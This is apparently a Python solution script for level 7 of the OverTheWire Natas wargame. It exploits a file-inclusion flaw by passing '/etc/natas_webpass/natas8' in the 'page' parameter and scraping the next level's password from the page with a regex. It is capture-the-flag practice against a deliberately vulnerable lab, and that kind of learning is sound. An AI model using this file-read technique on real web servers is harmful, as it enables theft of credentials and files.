import subprocess
import re
import requests
from requests.auth import HTTPBasicAuth

def get_pass():
    #"secret" value to beat level
    path = '/etc/natas_webpass/natas8'
    #Username and Password for natas website/level
    passw = subprocess.run(['getpass', '7'], stdout=subprocess.PIPE).stdout.decode('utf-8')
    auth = HTTPBasicAuth('natas7', passw.strip())
    #Get request to website, creates object that contains a .text property
    #text property holds the html of the webpage
    #Need to pass /etc/natas_webpass/natas8/ to view the natas8 password
    payload = {'page':path, 'submit':'Submit'}
    r = requests.get('http://natas7.natas.labs.overthewire.org/', auth=('natas7', passw.strip()), params=payload)
    passreg = '[a-zA-Z0-9]{32}'
    print(re.findall(passreg, r.text)[1])

if __name__ == "__main__":
    get_pass()
